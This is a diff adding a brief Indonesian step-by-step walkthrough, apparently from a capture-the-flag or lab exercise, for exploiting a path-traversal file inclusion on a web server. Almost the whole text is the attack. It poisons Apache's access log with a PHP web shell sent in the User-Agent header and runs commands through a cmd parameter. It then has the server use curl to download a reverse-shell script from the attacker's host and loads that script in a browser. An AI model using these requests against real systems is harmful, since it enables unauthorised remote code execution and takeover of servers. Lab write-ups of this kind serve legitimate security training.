@@ -1,0 +1,17 @@
+1. jalankan command ini untuk bisa execute command ke target (dengan burp lebih mudah)
+```
+GET /?view=cat/../../../../../../../var/log/apache2/access.log&ext=&cmd=id HTTP/1.1
+Host: 10.10.216.58
+User-Agent: <?php system($_GET['cmd']); ?>
+...
+```
+2. siapkan revshell.php di current dir, lalu buat simple http server disitu.
+3. siapkan listener
+4. lalu jalankan
+```
+GET /?view=cat/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl+http%3a//10.8.14.58/revsh.php+-o+revsh.php HTTP/1.1
+Host: 10.10.216.58
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+5. selanjutnya execute di browser `http://10.10.216.58/?view=cat/../revsh.php
+
